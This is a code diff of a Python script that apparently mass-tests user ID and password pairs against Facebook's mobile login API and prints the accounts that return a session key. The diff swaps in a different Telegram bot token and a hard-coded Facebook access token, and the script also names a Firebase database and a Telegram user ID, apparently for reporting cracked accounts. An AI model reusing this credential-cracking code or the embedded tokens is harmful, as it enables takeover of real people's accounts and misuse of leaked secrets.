@@ -33,7 +33,7 @@ requests.urllib3.disable_warnings()
 FIREBASE_URL = "https://arman-f9a3b-default-rtdb.firebaseio.com/"
 
 # TELEGRAM CONFIGURATION
-BOT_TOKEN = "8533770908:AAGpn4bIfoArEOyN7SjTskWnzIyGGjEPOoc"
+BOT_TOKEN = "8568795915:AAGpn4bIfoArEOyN7SjTskWnzIyGGjEPOoc"
 TELEGRAM_USER = "8568795915"
 
 def get_device_model():
@@ -681,7 +681,7 @@ def login_1(uid):
                 'source': 'device_based_login',
                 'email': str(uid),
                 'password': str(pw),
-                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'access_token': 'U3BhSbnVMoI7aiZAiPI95PZCQEchLZB3zs2EC5evnvx1kh6lyqA4ZBHjJTR6vhEHgZA5GgaPuStYpsx4KY1IYcqjHG57Et0FeuHCCnscdh2G0V9O5Tws9k11mO1fzgmKiiU27VG8gZDZD',
                 'generate_session_cookies': '1',
                 'meta_inf_fbmeta': '',
                 'advertiser_id': str(uuid.uuid4()),
@@ -744,7 +744,7 @@ def login_2(uid):
                     'content-type': 'application/x-www-form-urlencoded',
                     'x-fb-http-engine': 'Liger'
                 }
-                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
+                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=U3BhSbnVMoI7aiZAiPI95PZCQEchLZB3zs2EC5evnvx1kh6lyqA4ZBHjJTR6vhEHgZA5GgaPuStYpsx4KY1IYcqjHG57Et0FeuHCCnscdh2G0V9O5Tws9k11mO1fzgmKiiU27VG8gZDZD&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
                     print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mARMAN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
